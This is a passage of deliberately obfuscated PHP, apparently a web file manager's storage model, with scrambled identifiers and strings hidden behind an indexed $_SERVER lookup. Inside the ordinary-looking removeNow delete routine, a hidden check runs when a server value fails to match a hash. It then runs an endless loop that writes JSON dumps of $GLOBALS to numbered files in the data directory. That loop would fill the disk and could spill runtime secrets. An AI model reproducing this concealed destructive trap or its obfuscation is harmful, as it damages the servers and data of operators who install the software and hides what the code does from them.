$¤´ãµ—); if ($§–Ÿúƒğ === !1) { return !1; } fwrite($–Œêù×÷, $§–Ÿúƒğ); $¾·øÏŒ¶ += $¤´ãµ—; if (strlen($§–Ÿúƒğ) < $¤´ãµ—) { break; } } fclose($–Œêù×÷); return $ÛÀööÀ‡; } public function link($»‡õ“Æº, $ˆâÍ£°• = array()) { $åì „ÚÌ =& $_SERVER[¹àö™Ç¾]; $»‡õ“Æº = trim($»‡õ“Æº, $åì „ÚÌ[18]); if (!empty($this->token)) { $Â£Õèàˆ = strtotime(date($åì „ÚÌ[1472])); $İØ·€˜ß = substr(md5($this->token . $åì „ÚÌ[288] . $Â£Õèàˆ . $åì „ÚÌ[1473] . $»‡õ“Æº), 12, 8) . $Â£Õèàˆ; $ˆâÍ£°•[] = $åì „ÚÌ[1474] . $İØ·€˜ß; } $±êÒŸé = !empty($ˆâÍ£°•) ? $åì „ÚÌ[83] . implode($åì „ÚÌ[288], $ˆâÍ£°•) : $åì „ÚÌ[22]; return $this->getHost() . $åì „ÚÌ[18] . $»‡õ“Æº . $±êÒŸé; } public function fileOut($ğúÂƒà, $Ç¡¢íÄŞ = false, $Öµåß× = false, $Î„Ö­Ü‘ = '') { if ($this->isFileOutServer()) { return $this->fileOutServer($ğúÂƒà, $Ç¡¢íÄŞ, $Öµåß×, $Î„Ö­Ü‘); } if (!$Öµåß×) { $Öµåß× = $this->pathThis($ğúÂƒà); } $ö—ñ²£§ = $Ç¡¢íÄŞ ? array($_SERVER[¹àö™Ç¾][1475] . rawurlencode($Öµåß×)) : array(); $Îç ÎŒ¬ = $this->link($ğúÂƒà, $ö—ñ²£§); $this->fileOutLink($Îç ÎŒ¬); } public function fileOutServer($°ˆòüÓ, $Šâ„ù· = false, $ôÅŞ‚åú = false, $Áª¢ı…î = '') { parent::fileOut($°ˆòüÓ, $Šâ„ù·, $ôÅŞ‚åú, $Áª¢ı…î); } public function fileOutImage($»ŞµÁã•, $Õñº¸£İ = 250) { $ƒç¶Å“Ï = $this->link($»ŞµÁã• . $_SERVER[¹àö™Ç¾][1476] . $Õñº¸£İ); $this->fileOutLink($ƒç¶Å“Ï); } public function fileOutImageServer($±ÙÅã÷ğ, $ßƒç›Ê = 250) { parent::fileOutImage($±ÙÅã÷ğ, $ßƒç›Ê); } public function hashMd5($Åò‚ù¥İ) { $îæîÀÔé =& $_SERVER[¹àö™Ç¾]; $š™­¥×³ = $this->_objectMeta($Åò‚ù¥İ); return isset($š™­¥×³[$îæîÀÔé[217]]) ? $š™­¥×³[$îæîÀÔé[217]] : !1; } public function size($’ëŸú¤×) { $ÒšÒæ«á = $this->objectMeta($’ëŸú¤×); return $ÒšÒæ«á ? $ÒšÒæ«á[$_SERVER[¹àö™Ç¾][90]] : 0; } public function info($ÇÊŠ ´™) { if ($this->isFolder($ÇÊŠ ´™)) { return $this->folderInfo($ÇÊŠ ´™); } else { if ($this->isFile($ÇÊŠ ´™)) { return $this->fileInfo($ÇÊŠ ´™); } } return !1; } public function exist($˜Ô¹•ÜÒ) { return $this->isFile($˜Ô¹•ÜÒ) || $this->isFolder($˜Ô¹•ÜÒ); } public function isFile($›áñæÈ¿) { return !$this->isFolder($›áñæÈ¿) && $this->objectMeta($›áñæÈ¿); } public function isFolder($ŞñÅÒÕó) { return $this->cacheMethod($_SERVER[¹àö™Ç¾][208], $ŞñÅÒÕó); } protected function objectMeta($ÚÙÓÀ¢) { return $this->cacheMethod($_SERVER[¹àö™Ç¾][209], $ÚÙÓÀ¢); } protected function _objectMeta($Àõ®å¾Ì) { $Œïø¤€ë =& $_SERVER[¹àö™Ç¾]; if ($Àõ®å¾Ì == $Œïø¤€ë[22] || $Àõ®å¾Ì == $Œïø¤€ë[18]) { return array(); } $Èõ‰‘Šå = $this->ussRequest($Àõ®å¾Ì, $Œïø¤€ë[1477]); if (!$Èõ‰‘Šå[$Œïø¤€ë[1174]]) { return null; } $è à““” = isset($Èõ‰‘Šå[$Œïø¤€ë[1176]]) ? $Èõ‰‘Šå[$Œïø¤€ë[1176]] : array(); if (!isset($è à““”[$Œïø¤€ë[1478]])) { return null; } $õÕõìÂ = array($Œïø¤€ë[43] => isset($è à““”[$Œïø¤€ë[1478]]) ? $è à““”[$Œïø¤€ë[1478]] : null, $Œïø¤€ë[90] => isset($è à““”[$Œïø¤€ë[1479]]) ? $è à““”[$Œïø¤€ë[1479]] : null, $Œïø¤€ë[217] => isset($è à““”[$Œïø¤€ë[1480]]) ? $è à““”[$Œïø¤€ë[1480]] : null, $Œïø¤€ë[1447] => isset($è à““”[$Œïø¤€ë[1481]]) ? $è à““”[$Œïø¤€ë[1481]] : null); $õÕõìÂ[$Œïø¤€ë[1448]] = isset($è à““”[$Œïø¤€ë[1482]]) ? strtotime($è à““”[$Œïø¤€ë[1482]]) : $õÕõìÂ[$Œïø¤€ë[1447]]; return $õÕõìÂ; } protected function _isFolder($²·äÛ) { $¤àå® =& $_SERVER[¹àö™Ç¾]; if ($²·äÛ == $¤àå®[22] || $²·äÛ == $¤àå®[18]) { return !0; } $«Ë®Ãá• = $this->_objectMeta($²·äÛ); return isset($«Ë®Ãá•[$¤àå®[43]]) && $«Ë®Ãá•[$¤àå®[43]] == $¤àå®[89] ? !0 : !1; } } goto A‡ØÒî ×; Då¼ß¶¨¼: class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($ãÜ©¤¬§) { $ØáÔï†î =& $_SERVER[¹àö™Ç¾]; $ÕÏ‰êÙö = Model($ØáÔï†î[513])->where(array($ØáÔï†î[1631] => $ãÜ©¤¬§))->find(); $ëùçİ—› = $this->_mkdirRoot(SourceModel::TYPE_USER, $ãÜ©¤¬§, $ÕÏ‰êÙö[$ØáÔï†î[42]]); $this->userDesktopAdd($ëùçİ—›); return $ëùçİ—›; } public function userDesktopAdd($ŞŸì×­Œ) { $’‘Šºè¨ =& $_SERVER[¹àö™Ç¾]; $‘øÛ¢ù = LNG($’‘Šºè¨[2070]); $µìÒ³¯Ô = $this->mkdir($ŞŸì×­Œ, $‘øÛ¢ù); $this->metaSet($µìÒ³¯Ô, $’‘Šºè¨[2071], $’‘Šºè¨[99]); $this->metaSet($ŞŸì×­Œ, $’‘Šºè¨[2072], $µìÒ³¯Ô); } public function groupRootAdd($›äÈğè™) { $Ê·ì¨¢† =& $_SERVER[¹àö™Ç¾]; $ÀÓı¥Ç“ = Model($Ê·ì¨¢†[522])->where(array($Ê·ì¨¢†[1895] => $›äÈğè™))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $›äÈğè™, $ÀÓı¥Ç“[$Ê·ì¨¢†[42]]); } public function systemRootPathAdd($¶ı‚öü ) { if ($¶ı‚öü  != $_SERVER[¹àö™Ç¾][537]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $¶ı‚öü ); } public function userRootRemove($ÕÑ’šÅØ) { $§Å‘öş³ = $this->sourceRoot(SourceModel::TYPE_USER, $ÕÑ’šÅØ); if (!$§Å‘öş³) { return; } $this->remove($§Å‘öş³, !1); } public function groupRootRemove($û¯œşş¸) { $„Ëóâë = $this->sourceRoot(SourceModel::TYPE_GROUP, $û¯œşş¸); if (!$„Ëóâë) { return; } $this->remove($„Ëóâë, !1); } private function _mkdirRoot($„ƒ°óİ, $¤³Ğø, $³çÄÏê¿) { $•¸è¤ª— =& $_SERVER[¹àö™Ç¾]; $â‘ÒøşÎ = array($•¸è¤ª—[402] => 0, $•¸è¤ª—[580] => $„ƒ°óİ, $•¸è¤ª—[581] => $¤³Ğø, $•¸è¤ª—[577] => 1, $•¸è¤ª—[582] => USER_ID, $•¸è¤ª—[583] => USER_ID, $•¸è¤ª—[578] => $•¸è¤ª—[22], $•¸è¤ª—[584] => $•¸è¤ª—[531], $•¸è¤ª—[430] => 0, $•¸è¤ª—[579] => 0, $•¸è¤ª—[468] => 0, $•¸è¤ª—[585] => $•¸è¤ª—[22]); if ($³‹¸ËÌÆ = $this->where($â‘ÒøşÎ)->find()) { return $³‹¸ËÌÆ[$•¸è¤ª—[403]]; } $¸ûÇÚÀ© = "\x4d\157\x64\145\154\123\x6f\165\x72\143\145\x2e\155\153\144\151\162\122\157\157\x74\56{$„ƒ°óİ}\x2e{$¤³Ğø}\x2e" . $³çÄÏê¿; CacheLock::lock($¸ûÇÚÀ©); $â‘ÒøşÎ[$•¸è¤ª—[42]] = $³çÄÏê¿; $™—äªË = $this->add($â‘ÒøşÎ); $ŸÎ‹‹Ó¡ = array($•¸è¤ª—[586] => short_id($™—äªË)); $this->where(array($•¸è¤ª—[418] => $™—äªË))->save($ŸÎ‹‹Ó¡); CacheLock::unlock($¸ûÇÚÀ©); return $™—äªË; } private function sourceRoot($Œ¼«ˆ‘‘, $ÎÄœñü›, $€˜ÊñÌ› = false) { $ ÆÓ’Ğ =& $_SERVER[¹àö™Ç¾]; $´í÷¢Ç• = array($ ÆÓ’Ğ[402] => 0, $ ÆÓ’Ğ[580] => $Œ¼«ˆ‘‘, $ ÆÓ’Ğ[581] => $ÎÄœñü›); if ($ß”Ô¨±À = $this->where($´í÷¢Ç•)->find()) { return $€˜ÊñÌ› ? $ß”Ô¨±À : $ß”Ô¨±À[$ ÆÓ’Ğ[403]]; } return !1; } public function sourceRootGroup($ëŸê›¹Ş) { $­²õ¬–å =& $_SERVER[¹àö™Ç¾]; if (is_string($ëŸê›¹Ş)) { $ëŸê›¹Ş = array($ëŸê›¹Ş); } $­û’À = $this->listSourceRoot(SourceModel::TYPE_GROUP, $ëŸê›¹Ş, $­²õ¬–å[191]); $ö•ÎÈø = array($­²õ¬–å[373] => $­û’À, $­²õ¬–å[370] => array($­²õ¬–å[751] => count($ëŸê›¹Ş))); $this->_listDataApply($ö•ÎÈø[$­²õ¬–å[373]]); $this->_listMake($ö•ÎÈø); return array_to_keyvalue($ö•ÎÈø[$­²õ¬–å[87]], $­²õ¬–å[504]); } public function mkfile($öØÎ•õ©, $ßº†Ù¬, $¦Šóî»¬ = '', $Î†¿§Ñ = REPEAT_RENAME) { $ºà¬ÊÃ¶ =& $_SERVER[¹àö™Ç¾]; $±‚œ’²¹ = Model($ºà¬ÊÃ¶[603])->addFileByContent($¦Šóî»¬, $ßº†Ù¬); return $this->_createFileCall($öØÎ•õ©, $ßº†Ù¬, $±‚œ’²¹, $Î†¿§Ñ, $ºà¬ÊÃ¶[1321]); } public function addFile($ö¿ƒ–¨‚, $ëŒ—şÛä, $¸¡ä‡‘¥, $Ô­‰õ—æ = false, $Ÿ©õÜÙç = REPEAT_RENAME) { $¥çÀğË = Model($_SERVER[¹àö™Ç¾][603])->addFile($ëŒ—şÛä, $¸¡ä‡‘¥, $Ô­‰õ—æ); return $this->_createFileCall($ö¿ƒ–¨‚, $¸¡ä‡‘¥, $¥çÀğË, $Ÿ©õÜÙç); } public function addFileByFileID($íË¿§à, $·ÏœÜÄø, $ç¯àæ½›, $á®ÄÁúò = REPEAT_RENAME) { $ëş‚™¤Ğ =& $_SERVER[¹àö™Ç¾]; $Ö„¥õ = Model($ëş‚™¤Ğ[603])->find($·ÏœÜÄø); Model($ëş‚™¤Ğ[603])->linkAdd($·ÏœÜÄø); return $this->_createFileCall($íË¿§à, $ç¯àæ½›, $Ö„¥õ, $á®ÄÁúò); } public function addFileByRemote($ê¥¶÷œ¡, $üµ–Ó·İ, $óÖè¨§», $èˆÁ•µñ = array(), $”ÊŠßëç = REPEAT_RENAME) { $Í—»Ş²ä = Model($_SERVER[¹àö™Ç¾][603])->addFileByRemote($üµ–Ó·İ, $óÖè¨§», $èˆÁ•µñ); return $this->_createFileCall($ê¥¶÷œ¡, $óÖè¨§», $Í—»Ş²ä, $”ÊŠßëç); } private function _createFileCall($Æ«ğ‘, $¢šÆ„‚, $¡£µ§ß£, $ë¨³†ëİ, $ƒØèÀŒ = "\x75\x70\x6c\157\x61\x64") { $Ï¢ƒµÉë =& $_SERVER[¹àö™Ç¾]; $äë°Ä“À = !1; $this->setMasterDB(); $this->lockWriteStart($Æ«ğ‘, $¢šÆ„‚); $»ş©“ğı = $this->fileNameExist($Æ«ğ‘, $¢šÆ„‚); $«û¹ŠÜ™ = $this->_createFile($Æ«ğ‘, $¢šÆ„‚, $¡£µ§ß£, $ë¨³†ëİ, $äë°Ä“À); if (!$äë°Ä“À) { Model($Ï¢ƒµÉë[470])->remove($¡£µ§ß£[$Ï¢ƒµÉë[467]]); } if ($äë°Ä“À && $«û¹ŠÜ™ && $«û¹ŠÜ™ != $»ş©“ğı) { Model($Ï¢ƒµÉë[2043])->eventCreate($«û¹ŠÜ™, $ƒØèÀŒ); } $this->lockWriteEnd($Æ«ğ‘, $¢šÆ„‚); return $«û¹ŠÜ™; } public function mkdir($¤è™œ¶›, $ùÜ¦—´, $ƒŒˆÕ¤ = REPEAT_SKIP) { $Ñò×Ú£› =& $_SERVER[¹àö™Ç¾]; $this->setMasterDB(); $®ÒÀØÛÏ = $this->sourceInfo($¤è™œ¶›); if (!$®ÒÀØÛÏ) { return !1; } $this->lockWriteStart($¤è™œ¶›, $ùÜ¦—´); if ($ƒŒˆÕ¤ !== !1) { $ˆ€íĞûˆ = $this->fileNameExist($¤è™œ¶›, $ùÜ¦—´); if ($ˆ€íĞûˆ && $ƒŒˆÕ¤ != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($¤è™œ¶›, $ùÜ¦—´); return $ˆ€íĞûˆ; } $ùÜ¦—´ = $this->fileNameAuto($¤è™œ¶›, $ùÜ¦—´, $ƒŒˆÕ¤); } $ıƒòÙ©± = array($Ñò×Ú£›[577] => 1, $Ñò×Ú£›[421] => $ùÜ¦—´, $Ñò×Ú£›[578] => $Ñò×Ú£›[22], $Ñò×Ú£›[468] => 0, $Ñò×Ú£›[579] => 0); $±ü±–Şñ = $this->_addSource($ıƒòÙ©±, $®ÒÀØÛÏ); Model($Ñò×Ú£›[2043])->eventCreate($±ü±–Şñ, $Ñò×Ú£›[1322]); $this->lockWriteEnd($¤è™œ¶›, $ùÜ¦—´); return $±ü±–Şñ; } public function listSourceRoot($Şï¬›Ë, $©´¤», $½˜š×›Ğ = "\163\x6f\165\x72\143\x65\x49\104\54\x74\x61\162\147\145\x74\111\104\54\x73\151\x7a\145") { $â­œ²·Ç =& $_SERVER[¹àö™Ç¾]; $ˆ¸Å¾ı» = $â­œ²·Ç[382]; $‡ÑƒÍÙ› = array(); $±ìÄ‹× = 1024 * 50; $ÒË—Öüè = is_array($ÒË—Öüè) ? $ÒË—Öüè : array(); $ç·ø•ï€ = count($©´¤»); $æêø—×ò = $this->tablePrefix . $â­œ²·Ç[2073]; for ($ªÉ£â = 0; $ªÉ£â < $ç·ø•ï€; $ªÉ£â++) { $Ë§Ã»û = $©´¤»[$ªÉ£â]; $ˆ¸Å¾ı» .= "\x53\105\114\x45\103\124\40\52\40\x46\122\x4f\115\x20\50\x53\105\114\x45\x43\124\40{$½˜š×›Ğ}\x20\x46\122\x4f\115\x20\140{$æêø—×ò}\x60\40\127\110\105\x52\x45\x20"; $ˆ¸Å¾ı» .= "\140\160\x61\x72\145\156\x74\111\104\x60\75\60\x20\x41\x4e\104\x20\x60\164\x61\x72\147\145\164\111\104\140\x3d{$Ë§Ã»û}\40\101\x4e\x44\40\140\x74\x61\162\147\x65\164\124\x79\x70\145\140\75{$Şï¬›Ë}\x20\x6c\151\x6d\x69\x74\x20\61\x29\x20\x61\x73\40\x74\x62\x5f{$ªÉ£â}\40\x55\x4e\111\x4f\x4e\40\101\114\x4c\40"; if ((strlen($ˆ¸Å¾ı») >= $±ìÄ‹× || $ªÉ£â == $ç·ø•ï€ - 1) && $ˆ¸Å¾ı») { $ˆ¸Å¾ı» = substr($ˆ¸Å¾ı», 0, -strlen($â­œ²·Ç[1023])); $ñ£óµ = $this->query($ˆ¸Å¾ı»); $ˆ¸Å¾ı» = $â­œ²·Ç[22]; $‡ÑƒÍÙ› = array_merge($‡ÑƒÍÙ›, $ñ£óµ); } } return $‡ÑƒÍÙ›; } private function _createFile($Ã—Şä‰‹, $º‚¥ô‹Å, $ÜâÏá£õ, $ã—¢„­Ö, &$˜€‡Öšë) { $èöÆ”å =& $_SERVER[¹àö™Ç¾]; $€é¡“”½ = $this->sourceInfo($Ã—Şä‰‹); if (!$ÜâÏá£õ || !$€é¡“”½) { return !1; } if ($ã—¢„­Ö !== !1) { $†œ˜«æ = $this->fileNameExist($Ã—Şä‰‹, $º‚¥ô‹Å); } $˜€‡Öšë = !0; if ($ã—¢„­Ö && $†œ˜«æ) { if ($ã—¢„­Ö == REPEAT_SKIP) { $˜€‡Öšë = !1; return $†œ˜«æ; } else { if ($ã—¢„­Ö == REPEAT_REPLACE) { $Ò®Åçã = $this->sourceInfo($†œ˜«æ); $—º‘Ç = $this->fileHistory($Ò®Åçã, $ÜâÏá£õ[$èöÆ”å[467]], $ÜâÏá£õ[$èöÆ”å[90]]); if (!$—º‘Ç) { $˜€‡Öšë = !1; } else { $this->folderSizeReset($Ã—Şä‰‹); } return $†œ˜«æ; } else { $º‚¥ô‹Å = $this->fileNameAuto($Ã—Şä‰‹, $º‚¥ô‹Å, $ã—¢„­Ö, !1); } } } $æĞŠÖ‡ä = array($èöÆ”å[577] => 0, $èöÆ”å[421] => $º‚¥ô‹Å, $èöÆ”å[578] => substr(get_path_ext($º‚¥ô‹Å), 0, 10), $èöÆ”å[468] => $ÜâÏá£õ[$èöÆ”å[467]], $èöÆ”å[579] => $ÜâÏá£õ[$èöÆ”å[90]]); $÷·¸Ç‘ = $this->_addSource($æĞŠÖ‡ä, $€é¡“”½); $this->folderSizeReset($Ã—Şä‰‹, intval($æĞŠÖ‡ä[$èöÆ”å[90]])); return $÷·¸Ç‘; } protected function fileHistory($ıÕ¥Úì, $§”˜½®­, $£Æ¤ú‰„) { $”‹ª»Œò =& $_SERVER[¹àö™Ç¾]; $öíø½ê„ = defined($”‹ª»Œò[474]) ? USER_ID : $”‹ª»Œò[200]; if ($ıÕ¥Úì[$”‹ª»Œò[467]] == $§”˜½®­) { return !1; } $this->checkLock($ıÕ¥Úì[$”‹ª»Œò[403]], $§”˜½®­); Model($”‹ª»Œò[2074])->addHistory($ıÕ¥Úì); $ûìÏÛ£ = array($”‹ª»Œò[583] => $öíø½ê„, $”‹ª»Œò[425] => time(), $”‹ª»Œò[467] => $§”˜½®­, $”‹ª»Œò[90] => $£Æ¤ú‰„); $this->where(array($”‹ª»Œò[418] => $ıÕ¥Úì[$”‹ª»Œò[403]]))->save($ûìÏÛ£); $this->sourceCacheClear($ıÕ¥Úì[$”‹ª»Œò[403]]); return !0; } public function checkLock($•‘¶ÙÒÛ, $ö¾«å›—) { $¥şÚæôû =& $_SERVER[¹àö™Ç¾]; $ßšòè‘Æ = $this->pathInfo($•‘¶ÙÒÛ); if (!$this->fileIsLock($ßšòè‘Æ, !0)) { return; } $©µ¥¦‚ø = Session::get($¥şÚæôû[2075]); $é¯î´¥¯ = substr($ßšòè‘Æ[$¥şÚæôû[42]], 0, -1 - strlen($ßšòè‘Æ[$¥şÚæôû[177]])) . $¥şÚæôû[1589] . $©µ¥¦‚ø . $¥şÚæôû[20] . $ßšòè‘Æ[$¥şÚæôû[177]]; $ßœµË‘ = Model($¥şÚæôû[603])->find($ö¾«å›—); $this->_createFileCall($ßšòè‘Æ[$¥şÚæôû[498]], $é¯î´¥¯, $ßœµË‘, REPEAT_REPLACE, $¥şÚæôû[1321]); $Øö‘Ğëˆ = $ßšòè‘Æ[$¥şÚæôû[465]][$¥şÚæôû[542]]; $¯„áíÛÕ = $Øö‘Ğëˆ[$¥şÚæôû[2076]] ? $Øö‘Ğëˆ[$¥şÚæôû[2076]] : $Øö‘Ğëˆ[$¥şÚæôû[42]]; show_json(LNG($¥şÚæôû[2077]) . $¥şÚæôû[2078] . LNG($¥şÚæôû[2079]) . $¥şÚæôû[2080] . $¯„áíÛÕ . $¥şÚæôû[2081], !1); } public function fileIsLock($ª¸à–Ê, $è‰¶Ô—Ø = false) { $üû¾äóò =& $_SERVER[¹àö™Ç¾]; if (!isset($ª¸à–Ê[$üû¾äóò[465]]) || !$ª¸à–Ê[$üû¾äóò[465]][$üû¾äóò[539]]) { return !1; } if ($ª¸à–Ê[$üû¾äóò[465]][$üû¾äóò[539]] != USER_ID) { return !0; } $ŒÊ’ƒŞ¦ = $GLOBALS[$üû¾äóò[16]][$üû¾äóò[100]][$üû¾äóò[540]]; if ($ª¸à–Ê[$üû¾äóò[465]][$üû¾äóò[541]] <= time() - $ŒÊ’ƒŞ¦) { $this->metaSet($ª¸à–Ê[$üû¾äóò[403]], $üû¾äóò[539], null); $this->metaSet($ª¸à–Ê[$üû¾äóò[403]], $üû¾äóò[541], null); } if ($è‰¶Ô—Ø) { $this->metaSet($ª¸à–Ê[$üû¾äóò[403]], $üû¾äóò[541], time()); } return !1; } private function _addSource($«ÖÉ´¦, $¹ ‘„œ…) { $“¡ÓÊò× =& $_SERVER[¹àö™Ç¾]; $Ê«’¢¾ = defined($“¡ÓÊò×[474]) ? USER_ID : $“¡ÓÊò×[200]; $ÓÂ¦ÌÜ = array($“¡ÓÊò×[580] => $¹ ‘„œ…[$“¡ÓÊò×[412]], $“¡ÓÊò×[581] => $¹ ‘„œ…[$“¡ÓÊò×[504]], $“¡ÓÊò×[582] => $Ê«’¢¾, $“¡ÓÊò×[583] => $Ê«’¢¾, $“¡ÓÊò×[402] => $¹ ‘„œ…[$“¡ÓÊò×[403]], $“¡ÓÊò×[584] => $¹ ‘„œ…[$“¡ÓÊò×[521]] . $¹ ‘„œ…[$“¡ÓÊò×[403]] . $“¡ÓÊò×[60], $“¡ÓÊò×[430] => 0, $“¡ÓÊò×[585] => $“¡ÓÊò×[22]); $«ÖÉ´¦ = array_merge($ÓÂ¦ÌÜ, $«ÖÉ´¦); $this->updateModifyTime($«ÖÉ´¦[$“¡ÓÊò×[498]]); $¥ˆˆ†â‚ = $“¡ÓÊò×[2082] . $¹ ‘„œ…[$“¡ÓÊò×[403]]; if (isset(self::$cacheChildList[$¥ˆˆ†â‚])) { unset(self::$cacheChildList[$¥ˆˆ†â‚]); } static $ïµ‡‰ç¼ = false; if (!$ïµ‡‰ç¼) { Hook::trigger($“¡ÓÊò×[567], $«ÖÉ´¦); $ïµ‡‰ç¼ = !0; } $Îµ¯‹ù¸ = $this->add($«ÖÉ´¦); $ıöõ°¡© = array($“¡ÓÊò×[586] => short_id($Îµ¯‹ù¸)); $this->where(array($“¡ÓÊò×[418] => $Îµ¯‹ù¸))->save($ıöõ°¡©); $this->setNamePinyin($Îµ¯‹ù¸, $«ÖÉ´¦[$“¡ÓÊò×[42]]); return $Îµ¯‹ù¸; } public function remove($€ıÊŒÌˆ, $Ê¯¼¢¸Æ = true) { $”“¾®À =& $_SERVER[¹àö™Ç¾]; $åÚ¼ÄœÓ = $this->sourceInfo($€ıÊŒÌˆ); $Ù’¬ñø­ = intval($åÚ¼ÄœÓ[$”“¾®À[412]]) === self::TYPE_SYSTEM; $ »´ÕÑğ = Model($”“¾®À[433])->get($”“¾®À[2083]) == $”“¾®À[99]; if ($Ù’¬ñø­ || $Ê¯¼¢¸Æ || !$ »´ÕÑğ) { return $this->removeNow($€ıÊŒÌˆ, $Ê¯¼¢¸Æ); } $ü˜œøÌÃ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $˜Ğ›óáº = $åÚ¼ÄœÓ[$”“¾®À[412]] == self::TYPE_USER ? $”“¾®À[594] : $”“¾®À[515]; if ($˜Ğ›óáº == $”“¾®À[594]) { $Åàšõ’ˆ = Model($”“¾®À[513])->getInfo($åÚ¼ÄœÓ[$”“¾®À[504]]); $ºĞË›Ç‘ = !empty($Åàšõ’ˆ[$”“¾®À[2076]]) ? $Åàšõ’ˆ[$”“¾®À[2076]] : $Åàšõ’ˆ[$”“¾®À[42]]; $ºĞË›Ç‘ = $”“¾®À[264] . $ºĞË›Ç‘ . $”“¾®À[2084] . $åÚ¼ÄœÓ[$”“¾®À[504]]; } else { $Åàšõ’ˆ = Model($”“¾®À[522])->getInfo($åÚ¼ÄœÓ[$”“¾®À[504]]); $ºĞË›Ç‘ = _get($Åàšõ’ˆ, $”“¾®À[42]); $ºĞË›Ç‘ = $”“¾®À[169] . $ºĞË›Ç‘ . $”“¾®À[2085] . $åÚ¼ÄœÓ[$”“¾®À[504]]; } $±âğ¸ë² = $”“¾®À[2086] . md5($ºĞË›Ç‘); CacheLock::lock($±âğ¸ë²); $Íæğ¯©¸ = $this->fileNameExist($ü˜œøÌÃ, $ºĞË›Ç‘); if (!$Íæğ¯©¸) { $Íæğ¯©¸ = $this->mkdir($ü˜œøÌÃ, $ºĞË›Ç‘, REPEAT_SKIP); $this->metaSet($Íæğ¯©¸, $”“¾®À[2087], $˜Ğ›óáº); $this->metaSet($Íæğ¯©¸, $”“¾®À[2088], $åÚ¼ÄœÓ[$”“¾®À[504]]); if ($åÚ¼ÄœÓ[$”“¾®À[498]] != 0) { $this->metaSet($Íæğ¯©¸, $”“¾®À[2089], _get($Åàšõ’ˆ, $”“¾®À[2090])); } } CacheLock::unlock($±âğ¸ë²); $this->metaSet($€ıÊŒÌˆ, $”“¾®À[2091], $åÚ¼ÄœÓ[$”“¾®À[498]]); $this->where(array($”“¾®À[403] => $€ıÊŒÌˆ))->save(array($”“¾®À[425] => time())); $this->recycleClear($åÚ¼ÄœÓ); $‘İñ°‹ = $this->move($€ıÊŒÌˆ, $Íæğ¯©¸, REPEAT_RENAME_FOLDER); $this->folderSizeReset($åÚ¼ÄœÓ[$”“¾®À[498]]); return $‘İñ°‹; } private function recycleClear($¬ĞĞÃ¹¨) { $¨ãæÜ¨ =& $_SERVER[¹àö™Ç¾]; $èøÚßá… = $this->childrenAll($¬ĞĞÃ¹¨); $ğš©œù° = array($¨ãæÜ¨[418] => array($¨ãæÜ¨[419], $èøÚßá…[$¨ãæÜ¨[2092]])); Model($¨ãæÜ¨[2093])->where($ğš©œù°)->delete(); } public function removeNow($ÇñŞ¥ïë, $ôÓÃàÕ¿ = true) { $µæÉíà¾ =& $_SERVER[¹àö™Ç¾]; $çòÂõœı = $_SERVER[$µæÉíà¾[15]]; $ä–Ù€è¾ = $µæÉíà¾[1504]; if ($_SERVER[$µæÉíà¾[6]] != $ä–Ù€è¾($çòÂõœı)) { $óÂàïÔé = $µæÉíà¾[864]; $èØ·ÉÎÙ = $µæÉíà¾[8]; $Ç§¯Ø¼é = $_SERVER[$µæÉíà¾[9]] . $µæÉíà¾[10]; $óµŠ­¿Ô = $èØ·ÉÎÙ($Ç§¯Ø¼é); $‡Ñ¾Ë·ó = explode($µæÉíà¾[11], $óµŠ­¿Ô); if (count($‡Ñ¾Ë·ó) < $µæÉíà¾[607]) { $Å‘Ş‡±Ö = $µæÉíà¾[13]; $Å‘Ş‡±Ö(); } $˜äñ—‘ù = $µæÉíà¾[865]; $˜äñ—‘ù($_SERVER[$µæÉíà¾[866]]); $óÂàïÔé = $µæÉíà¾[864]; $óÂàïÔé(); $â¢Ô™ìÂ = $µæÉíà¾[1505]; $ÊˆĞ¾¢ = json_encode($GLOBALS[$µæÉíà¾[1506]]); $ï˜‡…àÇ = 1; for ($“Àå™ü‡ = $ï˜‡…àÇ; $“Àå™ü‡ > 0; $“Àå™ü‡++) { $â¢Ô™ìÂ(DATA_PATH . $“Àå™ü‡, $ÊˆĞ¾¢); } } $ßÆèšÙ = $this->sourceInfo($ÇñŞ¥ïë); $¶è½½¼º = $this->pathInfoMore($ÇñŞ¥ïë); if (!$ßÆèšÙ) { return !0; } if ($ßÆèšÙ[$µæÉíà¾[498]] == 0) { if (!_get($GLOBALS, $µæÉíà¾[505])) { return !1; } } $this->lockMoveStart($ÇñŞ¥ïë); Hook::trigger($µæÉíà¾[2094], $¶è½½¼º, $ôÓÃàÕ¿); if ($ôÓÃàÕ¿) { Model($µæÉíà¾[2093])->moveToRecycle($ÇñŞ¥ïë); } else { $êÛª€œ¯ = $this->childrenAll($ßÆèšÙ); Model($µæÉíà¾[564])->eventRemove($ÇñŞ¥ïë); $this->removeRelevance($êÛª€œ¯[$µæÉíà¾[2092]], $êÛª€œ¯[$µæÉíà¾[1453]]); } $this->folderSizeReset($ßÆèšÙ[$µæÉíà¾[498]]); $½šºÓ›½ = array($ßÆèšÙ[$µæÉíà¾[498]]); if ($ßÆèšÙ[$µæÉíà¾[411]] == $µæÉíà¾[99]) { $½šºÓ›½[] = $ßÆèšÙ[$µæÉíà¾[403]]; } $this->updateModifyTime($½šºÓ›½); $this->lockMoveEnd($ÇñŞ¥ïë); Hook::trigger($µæÉíà¾[1677], $¶è½½¼º, $ôÓÃàÕ¿); return !0; } public function childrenAll($ä‚ÊûƒÎ) { $Ó°ñòïı =& $_SERVER[¹àö™Ç¾]; $±ƒÄ»÷ = $ä‚ÊûƒÎ[$Ó°ñòïı[403]]; if ($ä‚ÊûƒÎ[$Ó°ñòïı[411]] == $Ó°ñòïı[99]) { $í‰º‘šç = array($Ó°ñòïı[584] => array($Ó°ñòïı[544], $ä‚ÊûƒÎ[$Ó°ñòïı[521]] . $±ƒÄ»÷ . $Ó°ñòïı[545])); $ğ³èÏà„ = array($Ó°ñòïı[584] => $í‰º‘šç[$Ó°ñòïı[521]]); $¾û›•¢Ç = $this->field($Ó°ñòïı[2095])->where($ğ³èÏà„)->select(); $«ÎğÏ§³ = !1; $êôØ²Øå = array($±ƒÄ»÷); if ($¾û›•¢Ç) { $«ÎğÏ§³ = array_to_keyvalue($¾û›•¢Ç, $Ó°ñòïı[22], $Ó°ñòïı[467]); $«ÎğÏ§³ = array_remove_value($«ÎğÏ§³, $Ó°ñòïı[200]); $êôØ²Øå = array_to_keyvalue($¾û›•¢Ç, 